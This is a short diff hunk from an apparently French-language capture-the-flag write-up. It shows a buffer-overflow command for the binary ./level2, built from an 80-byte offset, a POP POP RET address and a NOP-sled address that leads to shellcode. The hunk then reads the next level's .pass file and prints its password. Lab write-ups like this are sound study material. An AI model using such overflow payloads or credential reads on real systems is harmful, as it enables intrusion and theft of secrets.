@@ -122,7 +122,7 @@ Breakpoint 1, 0x080484d4 in p ()
 On prend l'une des adresses qui ne contient que des **NOP**: <code>0xbffff8a6</code> et on génère notre commande pour le **buffer overflow** :
 <pre><code>(python -c 'print "A" * 80 + "\xc7\x85\x04\x08" + "\xa6\xf8\xff\xbf"') | ./level2</code></pre>
 > [OFFSET] = A * 80 [POP POP RET] = 0x080485c7 (little endian) [NOP ADDRESS] = Qui va mener au SHELLCODE
-<pre><code>cd ../level3 && cat .pass
+<pre><code>> cd ../level3 && cat .pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 </code></pre>
 
